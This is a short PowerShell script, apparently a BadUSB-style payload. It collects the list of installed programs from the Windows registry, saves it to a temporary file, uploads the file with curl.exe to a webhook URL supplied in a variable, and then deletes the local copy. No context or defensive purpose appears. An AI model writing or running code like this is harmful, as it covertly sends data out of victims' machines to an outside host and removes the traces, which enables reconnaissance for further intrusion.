$programsList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table
$programsList > "$env:TEMP\prog-list.txt"
$filePath = "$env:TEMP\prog-list.txt"
$hookurl = "$dc"
curl.exe -F "file1=@$filePath" $hookurl
Remove-Item $env:TEMP\prog-list.txt

